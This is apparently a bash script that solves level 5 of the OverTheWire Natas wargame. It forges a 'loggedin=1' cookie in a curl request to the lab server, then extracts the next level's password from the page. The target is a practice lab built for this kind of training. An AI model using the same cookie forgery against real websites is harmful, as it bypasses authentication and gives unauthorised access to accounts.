#!/bin/bash

export natas6pass=$(curl -s -H "Cookie: loggedin=1" -u natas5:$natas5pass natas5.natas.labs.overthewire.org | grep "The password for natas6 is " | sed 's/Access granted. The password for natas6 is //' | sed 's;</div>;;')
echo $natas6pass
